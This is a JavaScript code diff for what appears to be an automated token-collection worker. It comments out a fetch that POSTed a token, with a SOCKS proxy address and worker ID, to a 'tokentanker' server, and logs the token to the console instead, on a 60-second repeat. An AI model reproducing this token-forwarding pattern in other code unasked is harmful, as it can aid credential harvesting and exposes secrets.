@@ -8,23 +8,25 @@ function sendRequest() {
 }
 
 function makeAjaxCall1(token) {
-    fetch('http://p-tm-tokentanker.sd.infra/tokens', {
-        method: 'POST',
-        mode: "no-cors",
-        headers:  { 'Content-Type': 'application/json; charset=UTF-8'},
-        body: JSON.stringify({
-            "created_at": Math.floor(Date.now() / 1000),
-            "proxy": {
-                "group_id": 1,
-                "url": "sock5://91.220.170.34:1014"
-            },
-            "source": "dkbm.kbm.history",
-            "token": token,
-            "worker_uid": "da7cf524-3042-49a2-8324-36d138182666"
-        })
-    }).then((response) => {
-        console.log('token was send')
-    })
+    // fetch('http://p-tm-tokentanker.sd.infra/tokens', {
+    //     method: 'POST',
+    //     mode: "no-cors",
+    //     headers:  { 'Content-Type': 'application/json; charset=UTF-8'},
+    //     body: JSON.stringify({
+    //         "created_at": Math.floor(Date.now() / 1000),
+    //         "proxy": {
+    //             "group_id": 1,
+    //             "url": "sock5://91.220.170.34:1014"
+    //         },
+    //         "source": "dkbm.kbm.history",
+    //         "token": token,
+    //         "worker_uid": "da7cf524-3042-49a2-8324-36d138182666"
+    //     })
+    // }).then((response) => {
+    //     console.log('token was send')
+    // })
+
+    console.log('TOKEN: ' + token);
 
   window.clearInterval(window.interval_submit_ajax);
   window.interval_submit_ajax = window.setInterval(sendRequest, 60000);
